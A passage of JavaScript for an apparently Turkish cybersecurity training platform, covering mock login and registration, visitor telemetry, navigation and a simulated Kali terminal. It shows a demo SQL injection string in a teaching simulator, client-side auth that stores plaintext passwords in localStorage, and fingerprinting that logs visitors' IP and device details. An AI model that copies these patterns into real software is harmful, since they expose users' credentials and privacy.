                localStorage.setItem('cyber_token', token);
                localStorage.setItem('cyber_user', JSON.stringify(user));
                localStorage.setItem('cyber_callsign', user.username);
                localStorage.setItem('cyber_role', user.role);
                return {
                    ok: true,
                    status: 200,
                    data: {
                        token,
                        user,
                        message: 'Sistem Yöneticisi burak_wyxz olarak başarıyla giriş yapıldı.'
                    }
                };
            }

            // 4. Normal Kayıtlı Kullanıcılar (Başlangıçta 0 kullanıcı; kaydolanlar burada oturum açar)
            try {
                const registeredUsers = JSON.parse(localStorage.getItem('lfl_registered_users') || '[]');
                const found = registeredUsers.find(x => x.username.toLowerCase() === u.toLowerCase() && x.password === p);
                if (found) {
                    lflSecurityShield.resetFailedAttempts();
                    const token = generateMockJwt(found.username, 'operator');
                    const user = { id: found.id || Date.now(), username: found.username, email: `${found.username}@lostfromlight.local`, role: 'operator' };
                    localStorage.setItem('cyber_token', token);
                    localStorage.setItem('cyber_user', JSON.stringify(user));
                    localStorage.setItem('cyber_callsign', user.username);
                    localStorage.setItem('cyber_role', user.role);
                    return {
                        ok: true,
                        status: 200,
                        data: {
                            token,
                            user,
                            message: `Operatör ${user.username} olarak giriş başarılı.`
                        }
                    };
                }
            } catch (e) { }

            // Hatalı Giriş Sayacını Artır
            lflSecurityShield.recordFailedAttempt('HATALI_GİRİŞ');
            return {
                ok: false,
                status: 401,
                data: {
                    error: 'Hatalı kullanıcı adı veya parola!'
                }
            };
        },

        async register(username, password) {
            await new Promise(r => setTimeout(r, 100));
            const u = (username || '').trim();
            const p = (password || '');

            // 1. Askeri Savunma: Rate-Limit
            const rateLimit = lflSecurityShield.checkRateLimit();
            if (rateLimit.blocked) {
                return { ok: false, status: 429, data: { error: rateLimit.message } };
            }

            // 2. Askeri Savunma: WAF Denetimi
            const uWaf = lflSecurityShield.inspectPayload(u, 'KAYIT_KULLANICI_ADI');
            if (!uWaf.safe) return { ok: false, status: 403, data: { error: uWaf.message } };
            const pWaf = lflSecurityShield.inspectPayload(p, 'KAYIT_PAROLA');
            if (!pWaf.safe) return { ok: false, status: 403, data: { error: pWaf.message } };

            // 3. Giriş Validasyonu (Güvenli format)
            if (!u || u.length < 3 || u.length > 20) {
                return { ok: false, status: 400, data: { error: 'Kullanıcı adı 3 ile 20 karakter arasında olmalıdır.' } };
            }
            if (!/^[a-zA-Z0-9_]+$/.test(u)) {
                return { ok: false, status: 400, data: { error: 'Kullanıcı adı yalnızca harf, rakam ve alt çizgi içerebilir.' } };
            }
            if (!p || p.length < 4) {
                return { ok: false, status: 400, data: { error: 'Şifre en az 4 karakter olmalıdır.' } };
            }

            // 4. Rezerve Edilmiş Yönetici İsimleri Kontrolü (Askeri Seviye İzolasyon)
            const reserved = ['burak_wyxz', 'admin', 'root', 'system', 'superuser', 'moderator', 'administrator'];
            if (reserved.includes(u.toLowerCase())) {
                return { ok: false, status: 409, data: { error: 'Bu kullanıcı adı rezerve edilmiş ve sisteme aittir.' } };
            }

            // 5. Mevcut kayıtlı kullanıcılar kontrolü
            let localUsers = [];
            try {
                localUsers = JSON.parse(localStorage.getItem('lfl_registered_users') || '[]');
            } catch (e) {
                localUsers = [];
            }

            if (localUsers.some(x => x.username.toLowerCase() === u.toLowerCase())) {
                return { ok: false, status: 409, data: { error: 'Bu kullanıcı adı zaten alınmış.' } };
            }

            // 6. Yeni Kullanıcıyı Kaydet (Normal Operatör Yetkisi ile)
            const newUser = {
                id: Date.now(),
                username: u,
                password: p,
                role: 'operator',
                registeredAt: new Date().toISOString()
            };
            localUsers.push(newUser);
            localStorage.setItem('lfl_registered_users', JSON.stringify(localUsers));

            // Otomatik Token Üret & Oturum Aç
            const token = generateMockJwt(u, 'operator');
            const userObj = { id: newUser.id, username: u, email: `${u}@lostfromlight.local`, role: 'operator' };
            localStorage.setItem('cyber_token', token);
            localStorage.setItem('cyber_user', JSON.stringify(userObj));
            localStorage.setItem('cyber_callsign', userObj.username);
            localStorage.setItem('cyber_role', userObj.role);

            return {
                ok: true,
                status: 201,
                data: {
                    token,
                    user: userObj,
                    message: `Tebrikler ${u}! Operatör hesabınız başarıyla oluşturuldu.`
                }
            };
        },
        async me() {
            const token = localStorage.getItem('cyber_token') || sessionStorage.getItem('cyber_token');
            if (!token) return null;
            const savedUser = localStorage.getItem('cyber_user');
            if (savedUser) {
                try {
                    return { user: JSON.parse(savedUser) };
                } catch (e) { }
            }
            return {
                user: {
                    id: 1,
                    username: 'burak_wyxz',
                    role: 'admin',
                    email: 'burak_wyxz@lostfromlight.local'
                }
            };
        },

        // GERÇEK İSTEMCİ & ZİYARETÇİ TELEMETRİ YAKALAYICI (IP, OS, CİHAZ, KONUM)
        async sendVisitTelemetry(payload) {
            try {
                const ua = navigator.userAgent;

                // 1. Gerçek İşletim Sistemi Tespiti
                let os = 'Bilinmeyen OS';
                if (ua.indexOf('Win') !== -1) {
                    os = ua.indexOf('Windows NT 10.0') !== -1 ? 'Windows 10/11 x64' : 'Windows x64';
                } else if (ua.indexOf('Mac') !== -1) {
                    os = ua.indexOf('iPhone') !== -1 ? 'iOS (iPhone)' : (ua.indexOf('iPad') !== -1 ? 'iPadOS' : 'macOS Sonoma');
                } else if (ua.indexOf('Android') !== -1) {
                    os = 'Android OS (Mobil)';
                } else if (ua.indexOf('Linux') !== -1) {
                    os = 'Kali / Linux x86_64';
                }

                // 2. Gerçek Tarayıcı Tespiti
                let browser = 'Chrome Standart';
                if (ua.indexOf('Edg/') !== -1) browser = 'Microsoft Edge';
                else if (ua.indexOf('Chrome/') !== -1) browser = 'Google Chrome';
                else if (ua.indexOf('Firefox/') !== -1) browser = 'Mozilla Firefox';
                else if (ua.indexOf('Safari/') !== -1 && ua.indexOf('Chrome/') === -1) browser = 'Apple Safari';
                else if (ua.indexOf('OPR/') !== -1) browser = 'Opera';

                // 3. Cihaz Türü
                let device = 'Masaüstü Terminal';
                if (/Mobi|Android|iPhone/i.test(ua)) device = 'Akıllı Telefon (Mobil)';
                else if (/Tablet|iPad/i.test(ua)) device = 'Tablet';

                // 4. Donanım & Ekran Özellikleri
                const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`;
                const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Çekirdekli CPU` : '4 Çekirdekli CPU';
                const conn = navigator.connection ? `${(navigator.connection.effectiveType || '4G').toUpperCase()} (${navigator.connection.downlink || 15} Mbps)` : 'Genişbant / WiFi';

                // 5. Gerçek Public IP & Coğrafi Konum Çekme (Hafif ve Hızlı)
                let publicIp = sessionStorage.getItem('lfl_cached_visitor_ip');
                let locationStr = sessionStorage.getItem('lfl_cached_visitor_loc');

                if (!publicIp) {
                    try {
                        const controller = new AbortController();
                        const timer = setTimeout(() => controller.abort(), 2000);
                        const ipFetch = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                        clearTimeout(timer);
                        if (ipFetch.ok) {
                            const ipJson = await ipFetch.json();
                            if (ipJson && ipJson.ip) {
                                publicIp = ipJson.ip;
                                locationStr = 'Canlı İnternet İstemcisi 🌐';
                                sessionStorage.setItem('lfl_cached_visitor_ip', publicIp);
                                sessionStorage.setItem('lfl_cached_visitor_loc', locationStr);
                            }
                        }
                    } catch (e) {
                        // Offline or localhost
                    }
                }

                if (!publicIp) {
                    publicIp = '127.0.0.1 (Yerel İstemci)';
                    locationStr = 'Yerel Ağ / Localhost';
                }

                const currentUser = state.currentUser;
                const username = currentUser ? currentUser.username : 'Anonim Ziyaretçi';
                const role = currentUser ? currentUser.role : 'guest';

                let logs = [];
                try {
                    logs = JSON.parse(localStorage.getItem('lfl_access_logs') || '[]');
                } catch (e) {
                    logs = [];
                }

                const newLog = {
                    id: Date.now() + Math.random().toString(36).substring(2, 6),
                    timestamp: new Date().toISOString(),
                    ipAddress: publicIp,
                    country: locationStr || '🌐 Canlı Bağlantı',
                    operatingSystem: os,
                    browser: browser,
                    deviceType: device,
                    screen: screenRes,
                    cores: cores,
                    connection: conn,
                    language: navigator.language || 'tr-TR',
                    username: username,
                    role: role,
                    method: 'GET',
                    path: (payload && payload.path) ? payload.path : '/dashboard',
                    statusCode: 200
                };

                // Prevent spamming exact duplicate path within 5s
                const last = logs[0];
                if (last && last.ipAddress === newLog.ipAddress && last.path === newLog.path && (Date.now() - new Date(last.timestamp).getTime() < 5000)) {
                    return { ok: true };
                }

                logs.unshift(newLog);
                if (logs.length > 200) logs = logs.slice(0, 200);
                localStorage.setItem('lfl_access_logs', JSON.stringify(logs));
            } catch (e) { }
            return { ok: true, status: 200 };
        },

        async getAccessLogs() {
            let logs = [];
            try {
                logs = JSON.parse(localStorage.getItem('lfl_access_logs') || '[]');
            } catch (e) {
                logs = [];
            }
            return { logs };
        }
    };

    // ==========================================
    // UTILITIES
    // ==========================================
    function escapeHtml(str) {
        if (!str && str !== 0) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    function showToast(type, title, message) {
        const container = document.getElementById('toast-container');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = `toast-item toast-${type}`;
        toast.innerHTML = `
            <div class="toast-indicator"></div>
            <div class="toast-body">
                <strong class="toast-title">${escapeHtml(title)}</strong>
                <span class="toast-msg">${escapeHtml(message)}</span>
            </div>
            <button class="toast-close-btn">&times;</button>
        `;

        const closeBtn = toast.querySelector('.toast-close-btn');
        const dismiss = () => {
            toast.classList.add('toast-exit');
            setTimeout(() => toast.remove(), 260);
        };
        closeBtn.addEventListener('click', dismiss);
        setTimeout(dismiss, 4200);

        container.appendChild(toast);
    }

    // ==========================================
    // KALI LINUX OFFICIAL DRAGON INTRO ANIMATION
    // ==========================================
    function initIntroSplash() {
        const splash = document.getElementById('kali-intro-splash');
        if (!splash) return;

        const progressBar = document.getElementById('intro-progress-bar');
        const cliText = document.getElementById('intro-cli-text');
        const skipBtn = document.getElementById('btn-skip-intro');
        const replayBtn = document.getElementById('btn-replay-intro');

        const kernelBootSteps = [
            { pct: 10, msg: "[10%] İstemci taraflı JavaScript siber simülasyon motoru başlatılıyor..." },
            { pct: 35, msg: "[35%] Starter Track (18 Temel Eğitim Odası) müfredatı yükleniyor..." },
            { pct: 65, msg: "[65%] Red • Blue • Purple Team uzmanlaşma dalları hazırlanıyor..." },
            { pct: 85, msg: "[85%] 143+ Kali Web Terminal aracı ve CTF Arenası belleğe alınıyor..." },
            { pct: 100, msg: "[100%] LFL Siber Eğitim Platformu hazır — Kurulum gerektirmeden başla!" }
        ];

        let animationFrame = null;
        let isClosed = false;

        function closeSplash() {
            if (isClosed) return;
            isClosed = true;
            if (animationFrame) cancelAnimationFrame(animationFrame);
            splash.classList.add('fade-out');
            setTimeout(() => {
                splash.style.display = 'none';
                if (!state.visualsBooted) {
                    state.visualsBooted = true;
                    initRadarAnimation();
                    if (typeof initAnimationEngine === 'function') {
                        initAnimationEngine();
                    }
                }
            }, 350);
        }

        function playIntroSequence() {
            isClosed = false;
            splash.style.display = 'flex';
            splash.classList.remove('fade-out');
            if (progressBar) progressBar.style.width = '0%';
            if (cliText) cliText.textContent = "Siber eğitim odaları ve interaktif terminal motoru hazırlanıyor...";

            const duration = 3200; // 5 saniye sinematik Kali Linux Dragon intro
            const startTime = performance.now();

            // Hard fail-safe: sekme arka plana atılsa veya donma olsa bile 5.5s sonra kesin kapat
            setTimeout(() => {
                if (!isClosed) closeSplash();
            }, 3800);

            function frame(now) {
                if (isClosed) return;
                const elapsed = now - startTime;
                const progress = Math.min(elapsed / duration, 1.0);
                const pct = Math.round(progress * 100);

                if (progressBar) progressBar.style.width = pct + '%';

                for (let i = kernelBootSteps.length - 1; i >= 0; i--) {
                    if (pct >= kernelBootSteps[i].pct) {
                        if (cliText && cliText.textContent !== kernelBootSteps[i].msg) {
                            cliText.textContent = kernelBootSteps[i].msg;
                        }
                        break;
                    }
                }

                if (progress < 1.0) {
                    animationFrame = requestAnimationFrame(frame);
                } else {
                    setTimeout(() => {
                        closeSplash();
                    }, 280);
                }
            }

            animationFrame = requestAnimationFrame(frame);
        }

        // Skip button handler
        if (skipBtn) {
            skipBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                closeSplash();
            });
        }

        // ESC key handler
        window.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && splash.style.display !== 'none' && !isClosed) {
                closeSplash();
            }
        });

        // Replay button in topbar
        if (replayBtn) {
            replayBtn.addEventListener('click', () => {
                playIntroSequence();
            });
        }

        // Start initial intro
        playIntroSequence();
    }

    // ==========================================
    // THEME ENGINE
    // ==========================================
    function setTheme(theme) {
        state.theme = theme;
        localStorage.setItem('lfl_theme', theme);
        document.documentElement.setAttribute('data-theme', theme);
        document.body.setAttribute('data-theme', theme);
        document.body.className = `theme-corporate-cyber theme-${theme}`;

        const label = document.getElementById('current-theme-label');
        if (label) {
            const labels = {
                'cyber-midnight': 'Cyber Midnight',
                'emerald-matrix': 'Emerald Matrix',
                'slate-corporate': 'Slate Corporate',
                'clean-light': 'Clean Light'
            };
            label.textContent = labels[theme] || 'Cyber Midnight';
        }

        document.querySelectorAll('#theme-menu-popup .popup-item').forEach(item => {
            item.classList.toggle('active', item.dataset.themeVal === theme);
        });

        // Mirror in session storage
        sessionStorage.setItem('cyber_theme', theme);
        renderSessionStorageInspector();
    }

    // ==========================================
    // DROPDOWNS & NAVIGATION
    // ==========================================
    function bindDropdowns() {
        const btnTheme = document.getElementById('btn-theme-toggle');
        const menuTheme = document.getElementById('theme-menu-popup');

        if (btnTheme && menuTheme) {
            btnTheme.addEventListener('click', (e) => {
                e.stopPropagation();
                menuTheme.classList.toggle('hidden');
            });

            menuTheme.querySelectorAll('.popup-item').forEach(item => {
                item.addEventListener('click', () => {
                    const chosen = item.dataset.themeVal;
                    setTheme(chosen);
                    menuTheme.classList.add('hidden');
                });
            });
        }

        document.addEventListener('click', () => {
            if (menuTheme) menuTheme.classList.add('hidden');
        });
    }

    function navigateToPage(pageId) {
        if (pageId === 'page-academy') { window.location.href = 'academy.html'; return; }
        state.activePage = pageId;

        // Hide all pages, show target
        document.querySelectorAll('.app-page').forEach(page => {
            if (page.id === pageId) {
                page.classList.remove('page-hidden');
                page.classList.add('page-active');
            } else {
                page.classList.add('page-hidden');
                page.classList.remove('page-active');
            }
        });

        // Update active sidebar nav button
        document.querySelectorAll('.sidebar-nav .nav-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.page === pageId);
        });

        // Reveal any items on target page immediately
        document.querySelectorAll(`#${pageId} [data-reveal], #${pageId} [data-reveal-stagger]`).forEach(el => {
            el.classList.add('is-visible');
        });

        // Update breadcrumb
        const crumbTitle = document.getElementById('current-crumb-title');
        if (crumbTitle) {
            const isEn = (window.I18N && window.I18N.currentLang === 'en');
            const titles = isEn ? {
                'page-dashboard': 'Command Center',
                'page-academy': 'Cyber Academy',
                'page-commands': 'Cyber Code Library',
                'page-terminal': 'Kali Web Terminal',
                'page-quiz': 'Cyber Role Quiz',
                'page-glossary': 'Cyber Guide & Glossary',
                'page-ctf': 'Cyber CTF Arena',
                'page-logs': 'Visitor & System Logs'
            } : {
                'page-dashboard': 'Komuta Merkezi',
                'page-academy': 'Siber Akademi (Eğitim Planı)',
                'page-commands': 'Siber Kod Kütüphanesi',
                'page-terminal': 'Kali Web Terminal',
                'page-quiz': 'Siber Rol Testi',
                'page-glossary': 'Siber Kılavuz & Sözlük',
                'page-ctf': 'Siber CTF Arenası',
                'page-logs': 'Ziyaretçi & Sistem Logları'
            };
            crumbTitle.textContent = titles[pageId] || (isEn ? 'LFL Platform' : 'LFL Platform');
        }

        // Telemetry ping
        pingVisitorTelemetry(pageId);

        // Load logs if opening logs page
        if (pageId === 'page-logs') {
            loadAccessLogs();
        }

        // Scroll main stage to top smoothly
        const main = document.querySelector('.app-main');
        if (main) main.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Expose navigateToPage globally so inline triggers and external modules can invoke it safely
    window.navigateToPage = navigateToPage;

    function bindNavigation() {
        const sidebar = document.getElementById('app-sidebar');
        const toggleBtn = document.getElementById('btn-toggle-sidebar');
        const backdrop = document.querySelector('.sidebar-mobile-backdrop');

        function closeMobileSidebar() {
            if (sidebar) sidebar.classList.remove('mobile-open');
            if (backdrop) backdrop.classList.remove('active');
        }

        // Sidebar buttons
        document.querySelectorAll('.sidebar-nav .nav-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const target = btn.dataset.page;
                if (target) {
                    navigateToPage(target);
                    closeMobileSidebar();
                }
            });
        });

        // Sidebar toggle
        if (toggleBtn && sidebar) {
            toggleBtn.addEventListener('click', () => {
                if (window.innerWidth <= 768) {
                    sidebar.classList.remove('sidebar-collapsed');
                    const isOpen = sidebar.classList.toggle('mobile-open');
                    if (backdrop) backdrop.classList.toggle('active', isOpen);
                } else {
                    sidebar.classList.remove('mobile-open');
                    if (backdrop) backdrop.classList.remove('active');
                    sidebar.classList.toggle('sidebar-collapsed');
                }
            });
        }

        // Auto-clean collapsed state on resize
        window.addEventListener('resize', () => {
            if (window.innerWidth <= 768 && sidebar) {
                sidebar.classList.remove('sidebar-collapsed');
            } else if (sidebar) {
                sidebar.classList.remove('mobile-open');
                if (backdrop) backdrop.classList.remove('active');
            }
        });

        if (backdrop) {
            backdrop.addEventListener('click', closeMobileSidebar);
        }

        // Purple Team dashboard card jump to quiz
        const btnPurpleCard = document.getElementById('dash-card-purple-team');
        if (btnPurpleCard) {
            btnPurpleCard.addEventListener('click', () => navigateToPage('page-quiz'));
        }

        // Glossary quick jump button from dashboard card
        const btnGlossaryJump = document.getElementById('dash-view-glossary-btn');
        if (btnGlossaryJump) {
            btnGlossaryJump.addEventListener('click', () => navigateToPage('page-glossary'));
        }

        // Quick jump buttons from dashboard to terminal/academy
        const btnJumpTermDirect = document.getElementById('btn-jump-terminal-direct');
        if (btnJumpTermDirect) {
            btnJumpTermDirect.addEventListener('click', () => navigateToPage('page-terminal'));
        }

        // Copy developer social contact (Discord)
        document.querySelectorAll('.btn-copy-social').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.preventDefault();
                const copyText = btn.dataset.copy;
                if (!copyText) return;
                const icon = btn.querySelector('.dev-copy-icon');

                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(copyText).then(() => {
                        if (icon) {
                            icon.textContent = '✔';
                            icon.style.color = 'var(--green)';
                        }
                        showToast('success', 'Discord Kopyalandı', `"${copyText}" panoya kopyalandı.`);
                        setTimeout(() => {
                            if (icon) {
                                icon.textContent = '⧉';
                                icon.style.color = '';
                            }
                        }, 2000);
                    }).catch(() => {
                        prompt('Discord Kullanıcı Adı:', copyText);
                    });
                } else {
                    prompt('Discord Kullanıcı Adı:', copyText);
                }
            });
        });

        const btnIntroQuiz = document.getElementById('btn-intro-to-quiz') || document.getElementById('btn-intro-to-academy');
        if (btnIntroQuiz) {
            btnIntroQuiz.addEventListener('click', () => navigateToPage('page-quiz'));
        }

        const btnLanguageToggle = document.getElementById('btn-language-toggle');
        if (btnLanguageToggle) {
            btnLanguageToggle.onclick = (e) => {
                if (e) {
                    e.preventDefault();
                    e.stopPropagation();
                }
                I18N.toggle();
            };
        }

        const btnHeroRoleQuiz = document.getElementById('btn-hero-role-quiz');
        if (btnHeroRoleQuiz) {
            btnHeroRoleQuiz.addEventListener('click', () => navigateToPage('page-quiz'));
        }

        const btnTreeQuizAction = document.getElementById('btn-tree-quiz-action');
        if (btnTreeQuizAction) {
            btnTreeQuizAction.addEventListener('click', (e) => {
                e.preventDefault();
                navigateToPage('page-quiz');
                const main = document.querySelector('.app-main');
                if (main) main.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }

        const btnIntroTerminal = document.getElementById('btn-intro-to-terminal');
        if (btnIntroTerminal) {
            btnIntroTerminal.addEventListener('click', () => navigateToPage('page-terminal'));
        }

        const btnAcademyTerminal = document.getElementById('btn-open-terminal-from-academy');
        if (btnAcademyTerminal) {
            btnAcademyTerminal.addEventListener('click', () => navigateToPage('page-terminal'));
        }

        const btnAcademyToCommands = document.getElementById('btn-academy-to-commands');
        if (btnAcademyToCommands) {
            btnAcademyToCommands.addEventListener('click', () => navigateToPage('page-commands'));
        }

        const btnCommandsTerminal = document.getElementById('btn-open-terminal-from-commands');
        if (btnCommandsTerminal) {
            btnCommandsTerminal.addEventListener('click', () => navigateToPage('page-terminal'));
        }

        // Search button triggers glossary or terminal
        const btnSearch = document.getElementById('btn-quick-search');
        if (btnSearch) {
            btnSearch.addEventListener('click', () => {
                navigateToPage('page-glossary');
                const inp = document.getElementById('glossary-search-input');
                if (inp) {
                    inp.focus();
                    inp.select();
                }
            });
        }

        // Hotkey Ctrl+K / Cmd+K
        window.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
                e.preventDefault();
                navigateToPage('page-glossary');
                const inp = document.getElementById('glossary-search-input');
                if (inp) {
                    inp.focus();
                    inp.select();
                }
            }
        });
    }

    // ==========================================
    // 10-SECOND CYBER DEFENSE SIMULATOR
    // ==========================================
    function bindSimulator() {
        const btnSqli = document.getElementById('btn-sim-sqli');
        const btnIframe = document.getElementById('btn-sim-iframe');
        const simText = document.getElementById('sim-terminal-text');

        function setTerminalMsg(html) {
            if (!simText) return;
            simText.innerHTML = html;
        }

        if (btnSqli) {
            btnSqli.addEventListener('click', () => {
                if (state.simRunning) return;
                state.simRunning = true;
                setTerminalMsg(`<span style="color: #f87171;">[SALDIRI BAŞLATILDI]</span> <code>' OR 1=1; DROP TABLE Users; --</code> SQL Enjeksiyon probu gönderiliyor...`);

                setTimeout(() => {
                    setTerminalMsg(`
                        <span style="color: #22c55e; font-weight: 700;">[SAVUNMA AKTİF]</span>
                        EF Core LINQ Parametrik Filtreleme devreye girdi! Giriş ham SQL olarak değil, parametrik literal olarak yorumlandı.
                        <span style="color: #38bdf8;">Sonuç: 0 Veri Sızıntısı &bull; Güvenlik Seviyesi 100%</span>
                    `);
                    state.simRunning = false;
                    showToast('success', 'SQLi Engellendi', 'Parametrik LINQ sorgusu saldırıyı başarıyla nötralize etti.');
                }, 1100);
            });
        }

        if (btnIframe) {
            btnIframe.addEventListener('click', () => {
                if (state.simRunning) return;
                state.simRunning = true;
                setTerminalMsg(`<span style="color: #38bdf8;">[SALDIRI BAŞLATILDI]</span> Saldırgan harici bir web sitesine gizli iframe gömerek clickjacking deniyor...`);

                setTimeout(() => {
                    setTerminalMsg(`
                        <span style="color: #22c55e; font-weight: 700;">[SAVUNMA AKTİF]</span>
                        Kestrel <code>X-Frame-Options: DENY</code> başlığı yanıt verdi!
                        Tarayıcı iframe içine sayfayı yüklemeyi tamamen reddetti. UI Redressing imkansız kılındı.
                    `);
                    state.simRunning = false;
                    showToast('success', 'Clickjacking Engellendi', 'X-Frame-Options: DENY başlığı harici çerçeveleme girişimini kesti.');
                }, 1100);
            });
        }
    }

    // ==========================================
    // MULTI-TAB KALI WEB TERMINAL ENGINE
    // ==========================================
    function initKaliTerminal() {
        const terminalBody = document.getElementById('kali-terminal-body');
        const historyZone = document.getElementById('kali-history-zone');
        const input = document.getElementById('kali-cmd-input');
        const tabsBar = document.getElementById('kali-tabs-bar');
        const addTabBtn = document.getElementById('btn-kali-add-tab');

        if (!terminalBody || !historyZone || !input) return;

        // Multi-tab state
        let termTabs = [
            { id: 1, title: 'Sunny@SUNNY: ~', historyHtml: '', cmdHistory: [], historyCursor: -1 }
        ];
        let activeTabId = 1;
        let nextTabSeq = 2;

        function getActiveTab() {
            return termTabs.find(t => t.id === activeTabId) || termTabs[0];
        }

        function renderTabs() {
            if (!tabsBar) return;
            tabsBar.innerHTML = termTabs.map(tab => {
                const isActive = tab.id === activeTabId;
                const canClose = termTabs.length > 1;
                return `
                    <div class="kali-tab-item ${isActive ? 'active' : ''}" data-tab-id="${tab.id}">
                        <span class="kali-tab-icon">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <polyline points="4 17 10 11 4 5"/>
                                <line x1="12" y1="19" x2="20" y2="19"/>
                            </svg>
                        </span>
                        <span class="kali-tab-title">${escapeHtml(tab.title)}</span>
                        ${canClose ? `<button type="button" class="kali-tab-close" data-close-tab-id="${tab.id}">&times;</button>` : ''}
                    </div>
                `;
            }).join('');

            // Bind click to activate tab
            tabsBar.querySelectorAll('.kali-tab-item').forEach(item => {
                item.addEventListener('click', (e) => {
                    if (e.target.closest('.kali-tab-close')) return;
                    const id = parseInt(item.dataset.tabId, 10);
                    switchTab(id);
                });
            });

            // Bind tab close
            tabsBar.querySelectorAll('.kali-tab-close').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const id = parseInt(btn.dataset.closeTabId, 10);
                    closeTab(id);
                });
            });
        }

        function switchTab(tabId) {
            // Save current history HTML to active tab before switching
            const cur = getActiveTab();
            if (cur) cur.historyHtml = historyZone.innerHTML;

            activeTabId = tabId;
            const next = getActiveTab();
            if (next) {
                historyZone.innerHTML = next.historyHtml;
            }
            renderTabs();
            input.focus();
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }

        function addTab() {
            const newId = nextTabSeq++;
            const newTitle = `Sunny@SUNNY: ~ (${newId})`;
            const newTab = {
                id: newId,
                title: newTitle,
                historyHtml: `<div class="kali-motd-tab" style="color: #64748b; font-size: 11px; margin-bottom: 8px;">[Terminal Sekmesi #${newId} Açıldı &bull; Sandbox Ortamı Aktif]</div>`,
                cmdHistory: [],
                historyCursor: -1
            };
            termTabs.push(newTab);
            renderTabs();
            switchTab(newId);
            showToast('info', 'Yeni Terminal Sekmesi', `Sekme #${newId} başarıyla açıldı.`);
        }

        function closeTab(tabId) {
            if (termTabs.length <= 1) return;
            const idx = termTabs.findIndex(t => t.id === tabId);
            if (idx === -1) return;

            termTabs.splice(idx, 1);
            if (activeTabId === tabId) {
                activeTabId = termTabs[Math.max(0, idx - 1)].id;
            }
            renderTabs();
            switchTab(activeTabId);
        }

        if (addTabBtn) {
            addTabBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                addTab();
            });
        }

        // Focus input when clicking anywhere in terminal body
        terminalBody.addEventListener('click', () => {
            input.focus();
        });

        // Command Execution Engine
        function executeCommand(raw) {
            const trimmed = raw.trim();
            if (!trimmed) return;

            const activeTab = getActiveTab();
            activeTab.cmdHistory.push(trimmed);
            activeTab.historyCursor = activeTab.cmdHistory.length;

            if (trimmed.toLowerCase() === 'updates' || trimmed.toLowerCase() === 'changelog') {
                const isEn = (window.I18N && window.I18N.currentLang === 'en');
                const outHtml = isEn ?
                    `<span style="color:#00e5ff; font-weight:700;">[ LFL PLATFORM CHANGELOG // RECENT RELEASES ]</span><br/>` +
                    `<span style="color:#94a3b8;">* Active Version: </span><span style="color:#10b981; font-weight:700;">v4.1 [LIVE &amp; STABLE]</span><br/>` +
                    `<span style="color:#94a3b8;">* Release Date: November 10, 2026</span><br/>` +
                    `<span style="color:#94a3b8;">* 101 Bilingual Components, 69 Academy Rooms, 143+ Tools.</span><br/>` +
                    `<span style="color:#c084fc;">Opening comprehensive graphical Changelog modal on screen...</span>` :
                    `<span style="color:#00e5ff; font-weight:700;">[ LFL PLATFORM CHANGELOG // SİSTEM GÜNCELLEME GÜNLÜĞÜ ]</span><br/>` +
                    `<span style="color:#94a3b8;">* Aktif Sürüm: </span><span style="color:#10b981; font-weight:700;">v4.1 [CANLI &amp; AKTİF]</span><br/>` +
                    `<span style="color:#94a3b8;">* Son Güncelleme: 10 Kasım 2026</span><br/>` +
                    `<span style="color:#94a3b8;">* 101 İki Dilli Bileşen, 69 Görev Odası, 143+ Kali Komut Motoru.</span><br/>` +
                    `<span style="color:#c084fc;">Detaylı grafiksel Güncelleme Günlüğü penceresi ekranda açılıyor...</span>`;
                
                const cmdRow = document.createElement('div');
                cmdRow.className = 'kali-history-cmd';
                cmdRow.innerHTML = `
                    <div class="kali-prompt-line1">┌──(<span class="kali-user">Sunny</span><span class="kali-skull">㉿</span><span class="kali-host">SUNNY</span>)-[<span class="kali-path">~</span>]</div>
                    <div class="kali-input-row"><span class="kali-prompt-line2">└─$</span><span class="kali-executed-text">${escapeHtml(trimmed)}</span></div>
                `;
                historyZone.appendChild(cmdRow);

                const outputBox = document.createElement('div');
                outputBox.className = 'kali-output-block';
                outputBox.innerHTML = outHtml;
                historyZone.appendChild(outputBox);
                activeTab.historyHtml = historyZone.innerHTML;
                terminalBody.scrollTop = terminalBody.scrollHeight;

                setTimeout(() => {
                    if (window.LFL_CHANGELOG && typeof window.LFL_CHANGELOG.open === 'function') {
                        window.LFL_CHANGELOG.open();
                    }
                }, 350);
                return;
            }

            if (trimmed.toLowerCase() === 'clear') {
                historyZone.innerHTML = '';
                activeTab.historyHtml = '';
                return;
            }

            // Create command echo row
            const cmdRow = document.createElement('div');
            cmdRow.className = 'kali-history-cmd';
            cmdRow.innerHTML = `
                <div class="kali-prompt-line1">
                    ┌──(<span class="kali-user">Sunny</span><span class="kali-skull">㉿</span><span class="kali-host">SUNNY</span>)-[<span class="kali-path">~</span>]
                </div>
                <div class="kali-input-row">
                    <span class="kali-prompt-line2">└─$</span>
                    <span class="kali-executed-text">${escapeHtml(trimmed)}</span>
                </div>
            `;
            historyZone.appendChild(cmdRow);

            // Generate realistic output
            const output = generateTerminalResponse(trimmed);
            const outputBox = document.createElement('div');
            outputBox.className = 'kali-output-block';
            outputBox.innerHTML = output;
            historyZone.appendChild(outputBox);

            // Update active tab history
            activeTab.historyHtml = historyZone.innerHTML;

            // Scroll down
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }

        // Expose globally so buttons can run commands directly
        window.runKaliCommand = function (cmd) {
